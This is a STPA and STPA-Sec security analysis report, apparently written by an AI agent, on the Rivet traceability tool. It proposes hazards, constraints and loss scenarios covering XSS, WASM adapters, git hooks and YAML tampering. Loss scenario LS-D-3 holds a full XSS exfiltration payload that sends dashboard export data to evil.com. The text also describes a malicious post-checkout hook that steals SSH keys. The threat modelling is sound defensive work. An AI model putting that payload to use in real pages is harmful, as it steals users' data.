# STPA and STPA-Sec Fresh Analysis Report

**Date:** 2026-03-16
**Scope:** Full Rivet codebase at current state (branch `feat/compound-layout`)
**Method:** Fresh STPA (Steps 1-4) + STPA-Sec extension + OSLC lifecycle lens

---

## Executive Summary

This report presents a fresh STPA analysis performed against the current Rivet codebase, comparing findings against the existing STPA artifacts in `safety/stpa/`. The analysis identified:

- **0 new losses** needed (existing 6 losses remain complete)
- **5 new hazards** (H-13 through H-17) for components added since the last analysis
- **5 new system constraints** (SC-15 through SC-19)
- **3 new controllers** added to the control structure (CTRL-EXPORT, CTRL-YAML-EDIT, CTRL-SALSA)
- **15 new UCAs** across export, document rendering, commit traceability, and WASM runtime
- **14 loss scenarios** needed (8 for existing UCAs lacking them + 6 for new UCAs)
- **6 STPA-Sec findings** with missing mitigations
- **3 OSLC lifecycle gaps**

---

## Part 1: Fresh STPA Analysis

### Step 1: Loss Completeness Review

The existing 6 losses were evaluated against all new capabilities:

| Loss | Title | Still Complete? | Notes |
|------|-------|-----------------|-------|
| L-1 | Loss of traceability integrity | Yes | Export, markdown rendering, and document validation all create derivative representations of traceability data. HTML export integrity falls under L-1 (incorrect traceability data in reports) and L-2 (compliance evidence). |
| L-2 | Loss of compliance evidence | Yes | HTML exports used as audit evidence are covered: an incorrect export is misleading compliance evidence. |
| L-3 | Loss of data sovereignty | Yes | YAML mutation and cross-repo sync are data sovereignty concerns. |
| L-4 | Loss of engineering productivity | Yes | Salsa cache staleness and build-system misparsing waste engineering time. |
| L-5 | Loss of safety assurance | Yes | All new hazards eventually chain to L-5 through traceability gaps. |
| L-6 | Loss of audit trail | Yes | YAML mutation without attribution is an audit trail concern. |

**Verdict: No new losses needed.** The existing 6 losses adequately cover all new capabilities. The requested losses for "export integrity," "incremental validation correctness," and "formal proof validity" are already subsumed by L-1, L-2, and L-5 respectively.

### Step 2: New Hazards

The following hazards were identified for code added since the last STPA analysis. Note: the user requested IDs H-13+ but some of the proposed hazards (XSS via markdown, salsa staleness, build-system misparsing) overlap with existing hazards. Where overlap exists, I note the existing hazard and add only genuinely new hazards.

**Already covered by existing hazards:**

- "salsa cache returns stale results after schema change" -- **H-9** and sub-hazards H-9.1, H-9.2
- "build-system provider misidentifies dependency versions" -- **H-11** and sub-hazards H-11.1, H-11.2
- "impact analysis misses transitively affected artifacts" -- subsumable under **H-1** (stale cross-references) and **H-3** (incorrect coverage metrics)

**New hazards:**

```yaml
# Proposed additions to safety/stpa/hazards.yaml

  - id: H-13
    title: Rivet document renderer produces HTML containing unescaped artifact content
    description: >
      The markdown-to-HTML renderer in document.rs processes artifact
      descriptions, titles, and field values into HTML output for the
      dashboard and document views. If artifact content contains HTML
      entities, script tags, or event handler attributes that are not
      properly escaped, the rendered output enables cross-site scripting
      (XSS) in the dashboard. In a worst-case environment where the
      dashboard is used during an audit review or shared via screen
      recording, injected scripts could alter displayed traceability
      data, exfiltrate session information, or modify the visual
      presentation of compliance metrics.
    losses: [L-1, L-2, L-3]

  - id: H-14
    title: Rivet WASM adapter executes untrusted code that corrupts import results
    description: >
      The WASM runtime (wasm_runtime.rs) loads and executes third-party
      adapter components. A compromised or buggy WASM adapter could
      return fabricated artifacts, modify link targets, inject additional
      artifacts, or silently drop artifacts during import. The host trusts
      the adapter's output without independent verification against the
      source data. In a worst-case environment where adapters are
      distributed as binary components without source review, a supply
      chain attack could introduce falsified traceability data.
    losses: [L-1, L-3, L-5]

  - id: H-15
    title: Rivet commit traceability analysis produces false coverage from misidentified artifact references
    description: >
      The commit analysis engine (commits.rs) extracts artifact IDs from
      git trailer values using pattern matching (PREFIX-DIGITS). False
      positives occur when non-artifact strings match this pattern (e.g.,
      "ISO-26262" parsed as artifact ID "ISO-26262", or "SHA-256" parsed
      as "SHA-256"). False negatives occur when artifact IDs use
      non-standard formats (e.g., "H-1.2", "UCA-C-10") that the regex
      does not match. Both inflate or deflate commit-artifact coverage
      metrics, misrepresenting implementation completeness.
    losses: [L-1, L-2]

  - id: H-16
    title: Rivet dashboard serves stale data after hot-reload fails silently
    description: >
      The dashboard server (serve.rs) provides a reload endpoint that
      re-reads all artifact files, schemas, and documents from disk. If
      the reload encounters a parse error in one YAML file, it may fail
      and leave the in-memory state unchanged without notifying the user.
      The dashboard continues serving the pre-reload state while the
      user believes they are viewing current data. In a worst-case
      environment where an engineer has just fixed a validation error
      and reloaded, they see the old (passing) state and conclude
      their fix is working when it actually introduced a new error.
    losses: [L-1, L-3, L-4]

  - id: H-17
    title: Rivet cross-repo sync clones arbitrary git repositories specified in rivet.yaml
    description: >
      The externals module (externals.rs) executes `git clone` and
      `git fetch` commands against URLs specified in the project's
      rivet.yaml configuration. A malicious or compromised rivet.yaml
      could specify a git URL pointing to a hostile repository. The
      clone/fetch operation may trigger git hooks, download large
      volumes of data, or overwrite local state in the cache directory.
      In a worst-case environment where rivet.yaml is modified in a
      supply chain attack, the sync command becomes a vector for
      arbitrary code execution via git hooks.
    losses: [L-3, L-5]
```

**Sub-hazards for H-13:**

```yaml
sub-hazards:
  - id: H-13.1
    parent: H-13
    title: Rivet dashboard renders artifact descriptions containing script injection
    description: >
      An artifact's description field contains `<script>` tags or
      `onerror` attributes. The dashboard's HTML rendering pipeline
      includes the content without sanitization in the artifact detail
      view, enabling script execution in the viewer's browser.

  - id: H-13.2
    parent: H-13
    title: Rivet document renderer passes markdown image URLs without validation
    description: >
      A markdown document references an image with a `javascript:` or
      `data:` URL scheme. The parse_markdown_link function in document.rs
      only allows http/https/# URLs, but the img tag rendering path may
      not apply the same restriction, enabling script injection via
      crafted image sources.
```

### Step 3: New System Constraints

```yaml
# Proposed additions to safety/stpa/system-constraints.yaml

  - id: SC-15
    title: Rivet must HTML-escape all artifact content before rendering in dashboard or document views
    description: >
      Every artifact field value (title, description, custom fields) and
      document body content must be HTML-escaped before insertion into
      HTML output. Script tags, event handlers, and other HTML injection
      vectors must be neutralized. The escaping must occur at the output
      boundary (rendering), not at the input boundary (parsing), to
      ensure defense-in-depth.
    hazards: [H-13]

  - id: SC-16
    title: Rivet must validate WASM adapter outputs against the source data independently
    description: >
      After a WASM adapter returns imported artifacts, the host must
      verify that: (a) the number of returned artifacts is consistent
      with the source data size, (b) all returned artifact IDs conform
      to expected patterns, (c) no artifact IDs were injected that do
      not correspond to source records. Schema validation alone is
      insufficient because a compromised adapter could produce
      schema-conforming but fabricated artifacts.
    hazards: [H-14]

  - id: SC-17
    title: Rivet commit analysis must validate extracted artifact IDs against the known artifact set before counting coverage
    description: >
      The commit traceability engine must not count artifact references
      that do not resolve to known artifacts in the store as coverage.
      The is_artifact_id() heuristic must be supplemented with a
      store.contains() check. Unresolved references must be reported
      as broken refs, not counted as coverage.
    hazards: [H-15]

  - id: SC-18
    title: Rivet dashboard must report reload failures and indicate stale data state
    description: >
      When a dashboard reload fails (due to YAML parse errors, schema
      load failures, or filesystem issues), the server must: (a) return
      an error response to the reload request, (b) display a visible
      "stale data" banner on all dashboard pages until a successful
      reload occurs, (c) log the specific error that caused the reload
      failure.
    hazards: [H-16]

  - id: SC-19
    title: Rivet must not execute git clone/fetch against untrusted URLs without user confirmation
    description: >
      The externals sync operation must validate git URLs against an
      allowlist or require explicit user confirmation before cloning
      new repositories. Git clone operations must disable hooks in the
      cloned repository (--config core.hooksPath=/dev/null) to prevent
      arbitrary code execution.
    hazards: [H-17]
```

### Step 4: New UCAs

#### 4a. UCAs for Existing Controllers Needing Extension

**CTRL-DASH (Dashboard) — Document Rendering:**

```yaml
# Additional dashboard UCAs for document/HTML rendering

  - id: UCA-D-3
    description: >
      Dashboard renders artifact description content containing HTML
      injection without escaping.
    context: >
      An artifact's description field contains `<script>alert('xss')</script>`
      or `<img onerror="...">`. The dashboard detail view renders this
      content as raw HTML.
    hazards: [H-13]
    rationale: >
      Script injection in the dashboard compromises the integrity of
      all displayed traceability data for the current session.

  - id: UCA-D-4
    description: >
      Dashboard does not display reload errors when hot-reload fails.
    context: >
      User clicks reload, a YAML parse error occurs in one file,
      but the dashboard returns a success response and continues
      showing the old state.
    hazards: [H-16]
    rationale: >
      User believes they are viewing current data when the dashboard
      is serving stale state from before the edit.
```

**CTRL-CORE — Commit Traceability:**

```yaml
# Additional core UCAs for commit traceability

  - id: UCA-C-18
    description: >
      Core commit analysis extracts false-positive artifact IDs from
      trailer values that match the PREFIX-DIGITS pattern but are not
      actual artifact identifiers.
    context: >
      A commit trailer contains "Implements: ISO-26262 compliance" and
      the pattern matcher extracts "ISO-26262" as an artifact ID.
    hazards: [H-15]
    rationale: >
      False positive artifact references inflate commit coverage
      metrics, creating an illusion of implementation completeness.

  - id: UCA-C-19
    description: >
      Core commit analysis fails to extract artifact IDs that use
      sub-hazard notation (e.g., "H-1.2") or multi-letter suffixes
      (e.g., "UCA-C-10").
    context: >
      A commit trailer contains "Refs: H-1.2, UCA-C-10" but the
      is_artifact_id() function requires digits-only after the hyphen,
      so neither ID is extracted.
    hazards: [H-15, H-1]
    rationale: >
      False negative artifact references create coverage gaps. STPA
      artifacts (the most safety-critical) are systematically missed
      by the commit traceability engine.

  - id: UCA-C-20
    description: >
      Core does not detect circular cross-repo dependencies during
      external artifact loading.
    context: >
      Repo A declares repo B as external, and repo B declares repo A.
      The sync process enters an infinite loop or stack overflow.
    hazards: [H-11, H-1]
    rationale: >
      Circular dependencies cause the tool to hang or crash during
      sync, preventing any validation from completing.
```

**CTRL-CORE — WASM Runtime:**

```yaml
# Additional core UCAs for WASM adapter runtime

  - id: UCA-C-21
    description: >
      Core WASM runtime does not validate that adapter-returned
      artifacts correspond to actual records in the source data.
    context: >
      A WASM adapter returns 500 artifacts from a source file that
      contains only 50 records. The additional 450 are fabricated.
    hazards: [H-14]
    rationale: >
      Fabricated artifacts pass schema validation because they
      conform to the declared types, but they introduce false
      traceability links that inflate coverage.

  - id: UCA-C-22
    description: >
      Core WASM runtime does not enforce fuel limits, allowing a
      malicious adapter to consume unbounded CPU.
    context: >
      Fuel metering is configured but a bug in the fuel accounting
      allows the adapter to execute indefinitely, causing a denial
      of service.
    hazards: [H-14]
    rationale: >
      Denial of service during import blocks all validation and
      reporting operations.

  - id: UCA-C-23
    description: >
      Core WASM runtime leaks host filesystem paths to the guest
      adapter via WASI preopened directories.
    context: >
      The adapter is given access to the AADL directory via WASI
      preopened dirs. The adapter reads files outside the intended
      scope by exploiting symlinks or relative paths.
    hazards: [H-14, H-17]
    rationale: >
      Information disclosure of host filesystem structure aids
      further attacks. Arbitrary file read enables data exfiltration.
```

**CTRL-CORE — Lifecycle / Coverage:**

```yaml
  - id: UCA-C-24
    description: >
      Core lifecycle completeness check uses a hardcoded downstream
      type map that does not reflect the loaded schema's traceability
      rules.
    context: >
      The lifecycle.rs module hardcodes expected_downstream() mappings
      (requirement -> [feature, aadl-component, design-decision]).
      A project using the cybersecurity schema has different downstream
      expectations (e.g., threat-scenario -> countermeasure) that are
      not represented.
    hazards: [H-3, H-1]
    rationale: >
      Lifecycle gap analysis produces false negatives for schemas
      other than the dev schema, missing genuine coverage gaps in
      cybersecurity and STPA domains.
```

**CTRL-CORE — Document Validation:**

```yaml
  - id: UCA-C-25
    description: >
      Core document validation only checks [[ID]] references but does
      not validate {{artifact:ID}} embed references.
    context: >
      A document uses {{artifact:NOPE-999}} which renders as a broken
      embed card in the dashboard, but validate_documents() does not
      check this pattern, so no diagnostic is emitted.
    hazards: [H-1, H-3]
    rationale: >
      Broken artifact embeds in documents are invisible to validation,
      producing documents that appear complete but contain broken
      references.
```

**CTRL-CLI — External Sync:**

```yaml
  - id: UCA-L-6
    description: >
      CLI sync command executes git clone against an arbitrary URL from
      rivet.yaml without validating the URL or disabling git hooks.
    context: >
      A developer opens a project with a modified rivet.yaml containing
      a malicious git URL. Running `rivet sync` clones the repository,
      which includes a post-checkout hook that executes arbitrary code.
    hazards: [H-17]
    rationale: >
      The rivet.yaml file is the trust boundary for external
      dependencies. A compromised config file enables arbitrary
      code execution on the developer's machine.

  - id: UCA-L-7
    description: >
      CLI does not validate rivet.lock file integrity before using
      pinned commit SHAs for external sync.
    context: >
      An attacker modifies rivet.lock to point to a different commit
      SHA that contains compromised artifacts. The sync operation
      checks out the attacker-controlled commit.
    hazards: [H-17, H-14]
    rationale: >
      The lock file is meant to ensure reproducible baselines.
      If it can be tampered with undetected, the baseline guarantee
      is void.
```

### Step 5: Loss Scenarios

#### 5a. Loss Scenarios for Existing UCAs Currently Lacking Them

The following UCAs (UCA-C-10 through UCA-C-17) were identified as having no loss scenarios in `loss-scenarios.yaml`:

```yaml
# Proposed additions to safety/stpa/loss-scenarios.yaml

  # --- Incremental validation UCAs ---

  - id: LS-C-5
    title: Salsa input query not updated after file write
    uca: UCA-C-10
    type: inadequate-process-model
    hazards: [H-9, H-1, H-3]
    scenario: >
      The developer edits an artifact YAML file and saves it to disk.
      The salsa database's file-content input query was set when the
      file was first read. Because there is no file-watcher or
      explicit invalidation call between validation invocations in
      the same process (e.g., during `rivet serve`), the salsa
      database returns the cached parse result from the old file
      contents [UCA-C-10]. The link graph and validation diagnostics
      reflect the pre-edit state. The dashboard shows "0 errors"
      while the file on disk contains broken links [H-1, H-3].
    process-model-flaw: >
      The salsa database believes its file-content input still
      matches the on-disk content because no explicit set_file_content()
      call was made after the file was modified externally.
    causal-factors:
      - No file-system watcher to detect external file modifications
      - Salsa inputs are set once at load time, not refreshed
      - Dashboard reload may not invalidate all salsa inputs

  - id: LS-C-6
    title: Conditional rule evaluation uses cached field values
    uca: UCA-C-11
    type: inadequate-process-model
    hazards: [H-9, H-1]
    scenario: >
      A schema defines a conditional rule: "when status == approved,
      verification-criteria is required." An artifact has status=draft
      and no verification-criteria field. The salsa database caches
      the rule evaluation result as "not applicable" (because
      status != approved). The developer changes the artifact's status
      to "approved" but does not add verification-criteria. Because
      the salsa conditional-rule query depends only on the rule
      definition (not the artifact's field values), the cached "not
      applicable" result is returned [UCA-C-11]. The artifact passes
      validation despite missing the required field [H-1].
    process-model-flaw: >
      The salsa query for conditional rule evaluation does not track
      the artifact's field values as dependencies. It only depends
      on the rule definition, so field value changes don't trigger
      re-evaluation.
    causal-factors:
      - Conditional rule query does not declare artifact fields as inputs
      - Salsa dependency tracking is opt-in per query
      - No test verifies conditional rule re-evaluation after field change

  - id: LS-C-7
    title: Contradictory conditional rules not detected at schema load
    uca: UCA-C-12
    type: inadequate-control-algorithm
    hazards: [H-10]
    scenario: >
      A project uses two schema files: the ASPICE schema requires
      "verification-method" when status=approved, while a custom overlay
      schema forbids "verification-method" when safety-level=QM (to
      reduce overhead for non-safety items). An artifact with both
      status=approved and safety-level=QM triggers both rules. The
      schema merge algorithm does not check for rule conflicts [UCA-C-12].
      The developer sees two contradictory validation errors and disables
      one rule via a schema override, undermining the validation system.
    causal-factors:
      - Schema merge is purely additive (union of all rules)
      - No SAT-solver or constraint check for rule compatibility
      - Conditional rules lack a priority or override mechanism

  - id: LS-C-8
    title: Incremental validation diverges from full validation after rename
    uca: UCA-C-13
    type: inadequate-control-algorithm
    hazards: [H-9, H-3]
    scenario: >
      A developer renames an artifact from REQ-042 to REQ-042a. The
      salsa database invalidates the queries for the renamed artifact's
      file. However, other artifacts that link to REQ-042 are in
      different files whose salsa inputs have not changed. The
      incremental validation for those files returns cached "valid"
      results that still show links to REQ-042 as resolved [UCA-C-13].
      A full validation would detect the broken links. The dashboard
      shows 0 errors while a clean `rivet validate` shows 3 broken
      links.
    causal-factors:
      - Link resolution queries depend on the link graph, not individual files
      - Salsa does not track cross-file artifact ID dependencies
      - No periodic full-revalidation check is implemented

  - id: LS-C-9
    title: Schema loading races with conditional rule evaluation
    uca: UCA-C-14
    type: inadequate-control-algorithm
    hazards: [H-9, H-10]
    scenario: >
      The project loads schemas from three files: common.yaml,
      dev.yaml, and custom-overlay.yaml. The salsa query graph allows
      conditional rule evaluation to begin as soon as two schemas are
      merged (common + dev), before the overlay is loaded. The overlay
      adds a conditional rule that restricts certain field combinations.
      Artifacts evaluated before the overlay loads pass validation
      [UCA-C-14]. After the overlay loads, those same artifacts would
      fail. The final validation result depends on evaluation order,
      making it non-deterministic.
    causal-factors:
      - Schema merge is incremental (file-by-file) rather than all-at-once
      - No barrier between "all schemas loaded" and "evaluation begins"
      - Salsa query ordering is determined by demand, not explicit sequencing

  - id: LS-C-10
    title: Parser extracts registry version instead of git_override commit
    uca: UCA-C-15
    type: inadequate-control-algorithm
    hazards: [H-11, H-1]
    scenario: >
      A MODULE.bazel file declares `bazel_dep(name="meld", version="2.0")`
      and separately `git_override(module_name="meld", commit="abc123")`.
      The parser extracts the bazel_dep declaration and records
      meld@2.0. It does not process the git_override because the
      function name is not in its recognized set [UCA-C-15]. Cross-repo
      validation loads meld@2.0 from the registry cache instead of
      the pinned commit abc123. The traceability data comes from the
      wrong version of meld, and coverage results are meaningless [H-1].
    causal-factors:
      - Parser's function recognition list is incomplete
      - git_override is parsed separately from bazel_dep with no linkage
      - No test covers the override-applies-to-dep scenario

  - id: LS-C-11
    title: Parser silently skips load() statement containing dependency
    uca: UCA-C-16
    type: inadequate-control-algorithm
    hazards: [H-11]
    scenario: >
      A MODULE.bazel file uses `load("@rules_rust//rust:defs.bzl", "rust_library")`
      followed by a macro call that declares additional bazel_deps.
      The parser does not recognize load() statements and silently
      skips the line [UCA-C-16]. The macro-declared dependencies are
      invisible to Rivet. Cross-repo links to artifacts in those
      repos are reported as broken when they actually exist in the
      undiscovered external repos.
    causal-factors:
      - Starlark load() support is not implemented
      - Parser treats unrecognized lines as comments
      - No diagnostic emitted for skipped lines

  - id: LS-C-12
    title: Parser swaps keyword argument name and value
    uca: UCA-C-17
    type: inadequate-control-algorithm
    hazards: [H-11, H-1]
    scenario: >
      A MODULE.bazel file contains `bazel_dep(version="1.0", name="meld")`.
      The parser assumes positional argument order (name first, version
      second) rather than parsing keyword arguments [UCA-C-17]. It
      extracts name="1.0" and version="meld". The dependency is
      recorded with the wrong module name, causing cross-repo
      resolution to fail silently or resolve against the wrong repo.
    causal-factors:
      - Parser uses positional extraction rather than keyword matching
      - No unit test for non-standard argument ordering
      - CST construction assumes a fixed parameter order

#### 5b. Loss Scenarios for New UCAs

  - id: LS-D-3
    title: Artifact description XSS via dashboard rendering
    uca: UCA-D-3
    type: inadequate-control-algorithm
    hazards: [H-13]
    scenario: >
      A developer creates an artifact with description containing
      `<img src=x onerror="fetch('/api/export').then(r=>r.text()).then(d=>fetch('https://evil.com/?data='+btoa(d)))">`.
      The dashboard's artifact detail view renders this description
      by calling html_escape() on the description string. However,
      the html_escape function in document.rs is only called for
      markdown inline text, not for the artifact detail view in
      serve.rs, which may interpolate the description directly into
      HTML. The script executes in the auditor's browser, exfiltrating
      the current traceability view [H-13, L-2, L-3].
    causal-factors:
      - Multiple rendering paths with inconsistent escaping
      - serve.rs generates HTML via string formatting, not a template engine
      - No Content-Security-Policy header to mitigate XSS

  - id: LS-C-13
    title: WASM adapter returns fabricated artifacts
    uca: UCA-C-21
    type: inadequate-process-model
    hazards: [H-14]
    scenario: >
      A WASM adapter component is loaded from a .wasm file distributed
      as a binary. The adapter's import() function is called with a
      ReqIF source file containing 50 SpecObjects. The adapter returns
      80 artifacts — the original 50 plus 30 fabricated artifacts with
      valid-looking IDs (REQ-051 through REQ-080) that link to
      existing requirements, inflating coverage metrics [UCA-C-21].
      The host has no way to verify the count because the source data
      format is adapter-specific. Schema validation passes because the
      fabricated artifacts have valid types and fields.
    process-model-flaw: >
      The host trusts that the adapter's output faithfully represents
      the source data. There is no independent verification mechanism
      because the host cannot parse the adapter-specific source format.
    causal-factors:
      - WASM adapter output is trusted without independent verification
      - No artifact-count or hash-based integrity check on adapter output
      - Binary WASM components cannot be source-reviewed by users

  - id: LS-C-14
    title: Commit trailer false positive from non-artifact ID
    uca: UCA-C-18
    type: inadequate-control-algorithm
    hazards: [H-15]
    scenario: >
      A commit message contains the trailer "Refs: ISO-26262, MISRA-C2012".
      The is_artifact_id() function matches any string with uppercase
      prefix + hyphen + digits. "ISO-26262" matches (prefix="ISO",
      suffix="26262") and is extracted as an artifact reference [UCA-C-18].
      The store does not contain "ISO-26262", so it is counted as a
      broken reference. However, in the commit analysis summary, it
      inflates the "linked commits" count because the commit has at
      least one artifact reference (even though it's a false positive).
    causal-factors:
      - is_artifact_id() uses an overly broad pattern
      - No validation against the actual artifact store during extraction
      - Standard identifiers (ISO numbers, MISRA rules) match the pattern

  - id: LS-L-3
    title: Git clone executes malicious post-checkout hook
    uca: UCA-L-6
    type: control-path
    hazards: [H-17]
    scenario: >
      An attacker submits a PR that modifies rivet.yaml to add an
      external dependency pointing to a malicious git repository.
      The repository contains a .git/hooks/post-checkout script that
      exfiltrates SSH keys or modifies local source files. A reviewer
      approves the PR without noticing the rivet.yaml change. When
      any developer runs `rivet sync`, git clones the malicious repo
      and the post-checkout hook executes with the developer's
      permissions [UCA-L-6].
    causal-factors:
      - rivet.yaml changes are not flagged as security-sensitive in review
      - git clone enables hooks by default
      - No URL allowlist or domain restriction for external repos
      - sync command does not use --config core.hooksPath=/dev/null

  - id: LS-C-15
    title: Lifecycle check misses cybersecurity downstream requirements
    uca: UCA-C-24
    type: inadequate-process-model
    hazards: [H-3, H-1]
    scenario: >
      A project uses the cybersecurity schema with threat-scenario,
      countermeasure, and cybersecurity-requirement types. The
      lifecycle completeness check in lifecycle.rs only knows about
      requirement -> [feature, aadl-component, design-decision]
      mappings. Cybersecurity requirements have no expected downstream
      types in the hardcoded map [UCA-C-24]. The lifecycle gap analysis
      reports 0 gaps for cybersecurity requirements, even though none
      have countermeasure links. The safety engineer trusts the
      lifecycle check and misses genuine coverage gaps.
    process-model-flaw: >
      The lifecycle module's process model is hardcoded to the dev
      schema's traceability chain, not derived from the loaded schema's
      traceability rules. It does not know about cybersecurity or STPA
      type hierarchies.
    causal-factors:
      - expected_downstream() is hardcoded, not derived from schema rules
      - No test covers lifecycle checks with non-dev schemas
      - The module was written for the dev schema and not generalized
```

---

## Part 2: STPA-Sec Analysis

### 2.1 Supply Chain Attack: Compromised WASM Adapter

| Aspect | Detail |
|--------|--------|
| **Attack surface** | `wasm_runtime.rs` — `WasmAdapter::call_import()`, `call_render()`, `call_analyze()` |
| **Potential impact** | L-1 (fabricated traceability links), L-3 (data exfiltration via WASI), L-5 (false safety assurance from fabricated coverage) |
| **Existing mitigation** | Fuel metering (1B ops), memory limit (256 MiB), WASI preopened dirs are read-only |
| **Missing mitigation** | (1) No code signing or hash verification of .wasm files before loading. (2) No independent verification of adapter output against source data. (3) No sandboxed filesystem — adapter can read any preopened directory. (4) No audit log of adapter invocations and their inputs/outputs. |
| **Recommended constraint** | SC-16 (validate adapter outputs independently). Add: WASM component hash verification against a trusted manifest. |

### 2.2 Injection Attack: Malicious Artifact Content (XSS)

| Aspect | Detail |
|--------|--------|
| **Attack surface** | `document.rs` — `render_to_html()`, `resolve_inline()`, `html_escape()`; `serve.rs` — all HTML-generating routes |
| **Potential impact** | L-1 (altered traceability display), L-2 (manipulated audit evidence), L-3 (session/data exfiltration) |
| **Existing mitigation** | `html_escape()` function exists in document.rs and handles `&`, `<`, `>`, `"`. The `parse_markdown_link()` function restricts URLs to http/https/#. |
| **Missing mitigation** | (1) No Content-Security-Policy (CSP) header on the dashboard server. (2) serve.rs generates HTML via `format!()` string interpolation, not a template engine with auto-escaping. Each HTML route must manually remember to escape — a single missed interpolation creates an XSS vector. (3) No automated test that verifies HTML output is properly escaped for adversarial inputs. (4) `{{artifact:ID}}` embed rendering constructs HTML from artifact fields with html_escape, but there's no test for nested injection (e.g., artifact title containing quotes that break out of an HTML attribute). |
| **Recommended constraint** | SC-15 (HTML-escape all content). Add: CSP header (`script-src 'self'`), move to a template engine, add XSS-specific test cases. |

### 2.3 Data Integrity: YAML File Tampering Bypassing Validation

| Aspect | Detail |
|--------|--------|
| **Attack surface** | YAML artifact files on disk, `store.rs` — `Store::upsert()`, `store.rs` — `Store::insert()` |
| **Potential impact** | L-1 (corrupted traceability), L-3 (unauthorized modification), L-6 (audit trail gaps) |
| **Existing mitigation** | Git history provides an audit trail. `rivet validate` checks schema conformance and link integrity. CI runs validation as a merge gate. |
| **Missing mitigation** | (1) No file integrity checking between validation and report generation — an attacker who can modify files on disk between `rivet validate` and `rivet serve` (or `rivet stats`) can serve unvalidated data. (2) `Store::upsert()` overwrites artifacts without recording what changed or who changed it. (3) No cryptographic hash of the validated state is stored, so there's no way to detect post-validation tampering. |
| **Recommended constraint** | After validation passes, compute a hash of all artifact content. Report generation must verify the hash has not changed. Alternatively, validation and report generation must share the same in-memory state (currently true for `rivet serve` but not for separate CLI invocations). |

### 2.4 Information Disclosure: Export Leaking Internal Paths

| Aspect | Detail |
|--------|--------|
| **Attack surface** | `model.rs` — `Artifact.source_file`; `serve.rs` — source view routes; `document.rs` — `Document.source_file` |
| **Potential impact** | L-3 (information disclosure of filesystem structure, usernames, internal paths) |
| **Existing mitigation** | `Artifact.source_file` is `#[serde(skip)]` so it's not serialized in YAML exports. |
| **Missing mitigation** | (1) The dashboard source view (`/source/*`) serves raw file content including full filesystem paths in headers/URLs. An attacker with dashboard access sees the full path (e.g., `/Volumes/Home/username/git/project/safety/stpa/losses.yaml`). (2) Git commit information (author name, email, commit SHA) is displayed in the dashboard and would be included in any HTML export. (3) The `build_version()` function in main.rs embeds git branch, commit, and dirty state into the binary — this is visible in `rivet --version` output and potentially in generated reports. |
| **Recommended constraint** | Dashboard should use relative paths, not absolute filesystem paths. HTML exports should strip or anonymize source_file paths. Build metadata should be configurable (allow stripping in release builds). |

### 2.5 Denial of Service: Pathological Artifact Graphs

| Aspect | Detail |
|--------|--------|
| **Attack surface** | `links.rs` — `LinkGraph::reachable()`, `LinkGraph::build()`; `serve.rs` — graph visualization routes |
| **Potential impact** | L-4 (engineering productivity loss from hung processes) |
| **Existing mitigation** | `LinkGraph::reachable()` uses a visited-set to prevent infinite loops on cycles. `has_cycles()` uses petgraph's `is_cyclic_directed()`. |
| **Missing mitigation** | (1) `reachable()` uses a `Vec` for the visited set with `contains()` checks, giving O(n^2) performance for large graphs. A project with 10,000+ artifacts could experience significant slowdowns. (2) The dashboard graph visualization route computes ego-subgraphs and Sugiyama layouts. For deeply connected graphs, the layout computation could take minutes, with no timeout. (3) No limit on the number of artifacts or links that can be loaded — a malicious YAML file with millions of entries would exhaust memory. |
| **Recommended constraint** | Switch `reachable()` visited set to `HashSet`. Add a configurable timeout for layout computation. Add a configurable limit on artifact/link count with a diagnostic when exceeded. |

### 2.6 Configuration Tampering: Modified rivet.yaml

| Aspect | Detail |
|--------|--------|
| **Attack surface** | `rivet.yaml`, `rivet.lock`; `externals.rs` — `sync_external()`; `lib.rs` — `load_project_config()` |
| **Potential impact** | L-3 (data sovereignty via malicious external repos), L-5 (safety assurance via modified schemas) |
| **Existing mitigation** | rivet.yaml is version-controlled in git. Changes are visible in PR diffs. |
| **Missing mitigation** | (1) No schema pinning — if a schema is loaded from a path (not embedded), an attacker who modifies the schema file can weaken validation rules without changing rivet.yaml. (2) No integrity check on embedded schemas — a modified binary with weakened embedded schemas would pass all validation. (3) `rivet.lock` has no signature or checksum, so it can be modified to point to different commit SHAs without detection. |
| **Recommended constraint** | Embedded schemas should include a hash that is verified at load time. rivet.lock should include content hashes of external repo states. Schema files loaded from disk should be verified against expected hashes if available. |

---

## Part 3: OSLC Lifecycle Lens

### 3.1 Resource Integrity

**OSLC concern:** Are artifacts complete and consistent?

| Check | STPA Coverage | Gap? |
|-------|--------------|------|
| All artifacts have required fields | SC-1 (validate cross-references), validation in validate.rs checks required fields | No |
| All links resolve to valid targets | SC-1, UCA-C-4 (dangling links) | No |
| Schema conformance | SC-4 (semantic compatibility), UCA-C-6 (wrong schema) | No |
| Cross-repo artifact integrity | SC-10 (external artifact existence), H-11 (MODULE.bazel) | No |
| **Document-artifact consistency** | validate_documents() checks [[ID]] refs | **Gap: {{artifact:ID}} embeds not validated (UCA-C-25)** |

### 3.2 Change Management

**OSLC concern:** Are changes tracked and auditable?

| Check | STPA Coverage | Gap? |
|-------|--------------|------|
| All modifications attributed | SC-7 (audit trail), H-7 (unattributed modification) | No |
| Change history preserved | L-6 (audit trail), git commit history | No |
| Commit-artifact traceability | commits.rs, UCA-C-18/C-19 (extraction errors) | Partial — see H-15 |
| **Configuration change tracking** | | **Gap: rivet.yaml and schema file changes are not tracked as artifact-level events. A schema change that weakens a validation rule has no artifact-level audit trail.** |

### 3.3 Configuration Management

**OSLC concern:** Are baselines reproducible?

| Check | STPA Coverage | Gap? |
|-------|--------------|------|
| Deterministic artifact loading | SC-11 (incremental = full), deterministic file ordering | No |
| Reproducible baselines | externals.rs lock/baseline commands, rivet.lock | No |
| Schema versioning | Schema files have version metadata | No |
| **Build reproducibility** | | **Gap: No STPA analysis covers the scenario where the Rivet binary itself is not reproducible (different compiler flags, different embedded schema versions). Two developers running different Rivet versions against the same artifacts could get different validation results. SC-14 partially covers this for formal proofs but not for the tool binary itself.** |

### 3.4 Quality Management

**OSLC concern:** Are verification records trustworthy?

| Check | STPA Coverage | Gap? |
|-------|--------------|------|
| Test results linked to artifacts | results.rs, ResultStore | No |
| Coverage metrics from validated data | SC-3 (coverage from validated data), CC-C-8 | No |
| Report generation gated on validation | SC-6 (compliance reports from verified data), CC-L-2 | No |
| Formal verification of tool correctness | SC-14 (proofs validate implementation), H-12 | No |
| **Dashboard data freshness** | UCA-D-2 (stale metrics) | Partially covered, extended by H-16 |

---

## Part 4: Recommended New YAML Artifacts

### Priority 1: Immediate (new hazards and constraints)

1. **Add to `hazards.yaml`:** H-13, H-14, H-15, H-16, H-17, sub-hazards H-13.1, H-13.2
